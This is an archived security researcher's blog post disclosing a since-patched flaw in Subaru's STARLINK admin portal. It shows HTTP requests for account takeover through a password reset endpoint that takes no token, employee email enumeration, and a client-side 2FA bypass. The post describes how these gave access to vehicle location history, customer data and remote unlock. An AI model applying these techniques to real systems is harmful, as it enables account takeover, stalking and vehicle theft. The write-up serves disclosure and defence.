---
title: "Hacking Subaru: Tracking and Controlling Cars via the STARLINK Admin Panel"
source: https://samcurry.net/hacking-subaru
source_host: samcurry.net
clip_date: 2026-11-11T10:21:29+08:00
trace_id: d100f998-fb23-4598-8b2c-46a47161c430
content_hash: afd9646677560696be1338a7e30f51f856b06b0dc2e1fff75861b07a33decc25
status: synced
tags: []
series: null
feed_source: Sam Curry·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 41575244-d011-8156-9602-cf4c8bb3a397
ioc:
  cves: []
  cwes: []
  hashes:
    - ae6e4482f5c4493a79c8f3bd656f8bba
  domains: []
  tools: []
  techniques: []
---

![Hacking Subaru: Tracking and Controlling Cars via the STARLINK Admin Panel](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c2347ae25026127c.png)

## Introduction

On November 20, 2024, Shubham Shah and I discovered a security vulnerability in Subaru’s STARLINK connected vehicle service that gave us unrestricted targeted access to all vehicles and customer accounts in the United States, Canada, and Japan.

Using the access provided by the vulnerability, an attacker who only knew the victim’s last name and ZIP code, email address, phone number, or license plate could have done the following:

-   Remotely start, stop, lock, unlock, and retrieve the current location of any vehicle.
-   Retrieve any vehicle’s complete location history from the past year, accurate to within 5 meters and updated each time the engine starts.
-   Query and retrieve the personally identifiable information (PII) of any customer, including emergency contacts, authorized users, physical address, billing information (e.g., last 4 digits of credit card, excluding full card number), and vehicle PIN.
-   Access miscellaneous user data including support call history, previous owners, odometer reading, sales history, and more.

After reporting the vulnerability, the affected system was patched within 24 hours and never exploited maliciously.

## Proof of Concept

*Taking over a Subaru using only the license plate in about 10 seconds, retrieving over a years worth of location history from the vehicle*

*Map displaying 1,600 leaked coordinates from a 2023 Subaru Impreza, similar data was retrievable for any internet-connected Subaru*

## Vulnerability Writeup

A little over a year ago, I bought my mom a 2023 Subaru Impreza with the promise that she would let me borrow it to try and hack it. I’d spent the last few years hunting for vulnerabilities in other automakers, but didn’t yet have the chance to look at Subaru.

While visiting home for thanksgiving this year, I took my opportunity and asked for the account login to see if I could get anywhere.

### Auditing the MySubaru Mobile App

The first thing I wanted to test was the MySubaru app. This app allowed users to send vehicle commands, so I proxied the app using Burp Suite and intercepted the telematic command HTTP requests, hoping to find a vulnerability to unlock cars without authorization.

The below request was sent when unlocking a car via the app:

```
POST /g2v30/service/g2/unlock/execute.json;jsessionid=AE6E4482F5C4493A79C8F3BD656F8BBA HTTP/1.1
Host: mobileapi.prod.subarucs.com
Content-Type: application/json
Connection: keep-alive
Accept: */*
User-Agent: MySubaru-PROD-SOA/2024110100 CFNetwork/1568.300.101 Darwin/24.2.0
Content-Length: 83
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br

{
  "delay": 0,
  "unlockDoorType": "ALL_DOORS_CMD",
  "vin": "4S3GTAV64P3701234",
  "pin": "1234"
}
```

After failing to bypass the authorization for in-app vehicle commands, I looked around the app a bit more but couldn’t find anything interesting to test. Everything seemed properly secured. There weren’t a lot of endpoints. The authorization worked really well.

Maybe testing the MySubaru app was the wrong approach.

From my past experience with car companies, I knew there could be publicly accessible employee-facing applications with broader permissions than the customer-facing apps. With that in mind, I decided to shift focus and started hunting for other Subaru-related websites to test.

### Finding the Subaru Admin Panel

I sent my friend Shubs a message over Discord to see if he’d be interested in helping me find any potential Subaru employee applications. He said sure -- and then immediately sent me this message:

```
shubs — 11/19/2024
have you seen this host before?
subarucs.com
```

He noticed that ‘my.subaru.com’ (a domain that the MySubaru app was using) was a CNAME for ‘mys.prod.subarucs.com’ (a domain that I hadn’t seen before).

```
nslookup my.subaru.com
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
my.subaru.com   canonical name = www.mysubaru.com.
www.mysubaru.com        canonical name = mys.prod.subarucs.com.
Name:   mys.prod.subarucs.com
```

We ran a scan to find other subdomains and checked the output:

```
…
STARLINK® Admin Portal - https://portal.prod.subarucs.com/login.html
…
```

Well, that definitely looked like employee functionality. From a quick Google, it appeared that STARLINK was the name of Subaru’s in-vehicle infotainment system which provided all of the remote functionality for the vehicle. This appeared to be an admin panel related to it.

![The Subaru STARLINK admin panel.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/feeef3fc5d75eab7.png)

The Subaru STARLINK admin panel.

### Arbitrary Account Takeover on Subaru STARLINK Admin Portal

At first glance, it didn’t seem like there would be much here. It was just a login panel, and we didn’t have any credentials. I checked the source of the website hoping to see a bit more, and the following bit caught my eye:

```html
<script type="text/javascript" src="/assets/_js/starlinkEnroll.js"></script>
```

There were some interesting JavaScript files under the “/assets/\_js/” folder that were loaded into the login page, so I went ahead and brute forced the directory in hopes of finding other JavaScript files.

After a few minutes of running [FFuF](https://github.com/ffuf/ffuf), we got a hit for a “login.js” file which the following very interesting code snippet:

```javascript
$('#new_password_submit').on('click', function(e) {
	e.preventDefault();
	if($('#forgot-password-step4-form').valid()) {
		disableBtns();
		$.ajax({
            url: "/forgotPassword/resetPassword.json",
			type: "POST",
            contentType: "application/json",
            data: JSON.stringify({
                email: email,
                password: $('#new_password').val(),
                passwordConfirmation: $('#confirm_new_password').val()
            }),
			async: false
		}).done(function (response) {
```

It appeared that there was a “resetPassword.json” endpoint that would reset employee’s accounts without a confirmation token!

If this worked how it was written in the JavaScript, then an attacker could simply enter any valid employee email and take over their account. I sent the following POST request to confirm that the functionality was even accessible:

**HTTP Request**

```bash
POST /forgotPassword/resetPassword.json HTTP/1.1
Host: portal.prod.subarucs.com

{
  "email": "random@random.com",
  "password": "Example123!",
  "passwordConfirmation": "Example123!"
}
```

**HTTP Response**

```
HTTP/1.1 200
Content-type: application/json
Content-length: 7

“error”
```

It seemed to be working, we just needed to find an employee’s email address to test it on. Since this was a fairly large application, there were probably a bunch of different users, we just needed to find some way to enumerate them. I dug through the rest of the JS looking for an endpoint that might let us enumerate emails until I saw the following:

**HTTP Request**

```
GET /adminProfile/getSecurityQuestion.json?email=example@example.com HTTP/1.1
Host: portal.prod.subarucs.com
```

**HTTP Response**

```
HTTP/1.1 200
Content-type: application/json
Content-length: 7

{
  "error": "Invalid email"
}
```

The above endpoint would return the user’s security questions if their email was valid. We could use this to enumerate user accounts until we found someone that was active on this platform.

### Enumerating Employee Emails

Using LinkedIn, we did a quick search for “Subaru STARLINK” and found a few employees who appeared to be software engineers. After getting their names, we Googled and found that Subaru emails are in the following format:

```
[first_initial][last]@subaru.com
```

We tossed the few emails that we’d pieced together into the “getSecurityQuestion.json” endpoint and hit send. On the fourth attempt, we got a response back!

```html
<label for="securityQuestionId">
  <span class="securityQuestionText">What city were you born in?</span>
</label>
```

The `jdoe@subaru.com` (redacted) email was valid! We went back to the reset password endpoint and hit send.

**HTTP Request**

```bash
POST /forgotPassword/resetPassword.json HTTP/1.1
Host: portal.prod.subarucs.com

{
  "email": "jdoe@subaru.com",
  "password": "Example123!",
  "passwordConfirmation": "Example123!"
}
```

**HTTP Response**

```yaml
HTTP/1.1 200
Date: Wed, 20 Nov 2024 03:02:31 GMT
Content-Type: application/json
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Length: 9

"success"
```

It worked! We tried logging in.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f68ea82367743218.png)

We had successfully taken over an employee’s account, but there was now a 2FA prompt to actually use the website. It was custom, so we tried to see if there was anything to do to bypass it.

### Bypassing 2FA

We tried the simplest thing that we could think of: removing the client-side overlay from the UI.

**Match**

```javascript
$('#securityQuestionModal').modal('show');
```

**Replace**

```javascript
//$('#securityQuestionModal').modal('show');
```

After removing the client-side overlay, we clicked around and the whole app seemed to function normally. All of the buttons worked, and were returning server-side data.

![2FA bypassed.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9e23f710e1644862.png)

2FA bypassed.

### Tracking My Mom for the Last Year

The left navbar had a ton of different functionality, but the juiciest sounding one was “Last Known Location”. I went ahead and typed in my mom’s last name and ZIP code. Her car popped up in the search results. I clicked it and saw everywhere my mom had traveled the last year:

| Date | Odometer | Location |
| --- | --- | --- |
| 11/21/2024 6:18:56 PM | 14472.6 | 41.30136,-96.161142 |
| 11/21/2024 4:59:51 AM | 14472.6 | 41.301402,-96.161134 |
| 11/21/2024 4:49:02 AM | 14472.6 | 41.301286,-96.161145 |
| …   | …   | …   |
| 11/02/2023 1:44:24 PM | 6440.6 | 41.256003,-96.080627 |
| 11/01/2023 9:52:47 PM | 6432.5 | 41.301248,-96.159951 |
| 11/01/2023 12:16:02 PM | 6425.2 | 41.259397,-96.078775 |

The “Last Known Location” endpoint was more than the last location, it gave me the exact coordinates of everywhere that she had started her engine or used a telematics command over the **last year**. I didn’t realize this data was being collected, but it seemed that we had agreed to the STARLINK enrollment when we purchased it.

To better understand the data, I exported a year’s worth of location history from my mom’s 2023 Impreza and imported it into the Google Maps iframe below. The below map is a slightly modified export (some sensitive bits removed) of all of the locations she had visited.

### Visualizing a Year of Subaru Location History

*Map displaying 1,600 leaked coordinates from a 2023 Subaru Impreza, similar data was retrievable for any internet-connected Subaru*

![Our STARLINK purchase agreement history, accessible from the admin panel.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/110c0958164564ef.png)

Our STARLINK purchase agreement history, accessible from the admin panel.

There were a ton of other endpoints. One of them was a vehicle search which let you query a customer’s last name and zip code, phone number, email address, or VIN number (retrievable via license plate) and grant/modify access to their vehicle.

![Retrieving street address, phone number, email, emergency contacts, authorized users, and billing information of any Subaru STARLINK customer.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/92a3fb3fec091736.png)

Retrieving street address, phone number, email, emergency contacts, authorized users, and billing information of any Subaru STARLINK customer.

![The STARLINK search functionality which allows you to search via zip code and last name, VIN, email address, and phone number.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/77fd5648fe2c5ac6.png)

The STARLINK search functionality which allows you to search via zip code and last name, VIN, email address, and phone number.

### Unlocking a Friend’s Car

After searching and finding my own vehicle in the dashboard, I confirmed that the STARLINK admin dashboard should have access to pretty much any Subaru in the United States, Canada, and Japan. We wanted to confirm that there was nothing we were missing, so we reached out to a friend and asked if we could hack her car to demonstrate that there was no pre-requisite or feature which would’ve actually prevented a full vehicle takeover.

She sent us her license plate, we pulled up her vehicle in the admin panel, then finally we added ourselves to her car.

![Adding ourselves as an authorized user to our friend's Subaru to demonstrate that we could execute commands on their vehicle.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/eebeaac60b8a2b6f.png)

Adding ourselves as an authorized user to our friend's Subaru to demonstrate that we could execute commands on their vehicle.

We waited a few minutes, then we saw that our account had been created successfully.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2a83d2c36e40734a.png)

Now that we had access, I asked if they could peek outside and see if anything was happening with their car. I sent the “unlock” command. They then sent us this video.

![Success!](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/356a29c6556ce688.gif)

Afterwards, she confirmed that she did not receive any notification, text message, or email after we added ourselves as an authorized user and unlocked her car.

## Timeline

-   11/20/24 11:54 PM CST: Initial report sent to SecOps email
-   11/21/24 7:40 AM CST: Initial response from Subaru team
-   11/21/24 4:00 PM CST: Vulnerability fixed, unable to reproduce
-   01/23/25 6:00 AM CST: Blog post released

## Addendum

When writing this, I had a really hard time trying to do another blog post on car hacking. Most readers of this blog already work in security, so I really don’t think the actual password reset or 2FA bypass techniques are new to anyone. The part that I felt was worth sharing was the impact of the bug itself, and how the connected car systems actually work.

The auto industry is unique in that an 18-year-old employee from Texas can query the billing information of a vehicle in California, and it won’t really set off any alarm bells. It’s part of their normal day-to-day job. The employees all have access to a ton of personal information, and the whole thing relies on trust.

It seems really hard to really secure these systems when such broad access is built into the system by default.

## Thanks

Happy (late) holidays, thanks for reading! Huge thanks to the following people for helping write and review this post:

-   Gren ([https://bsky.app/profile/nop.codes](https://bsky.app/profile/nop.codes))
-   Ian Carroll ([https://x.com/iangcarroll](https://x.com/iangcarroll))
-   Justin Rhinehart ([https://twitter.com/sshell](https://twitter.com/sshell) \_)
-   Joseph Thacker ([https://x.com/rez0](https://x.com/rez0) \_\_)
-   Brett Buerhaus ([https://x.com/bbuerhaus](https://x.com/bbuerhaus))
-   Maik Robert ([https://x.com/xehle](https://x.com/xehle) \_)
-   Joel Margolis ([https://x.com/0xteknogeek](https://x.com/0xteknogeek))
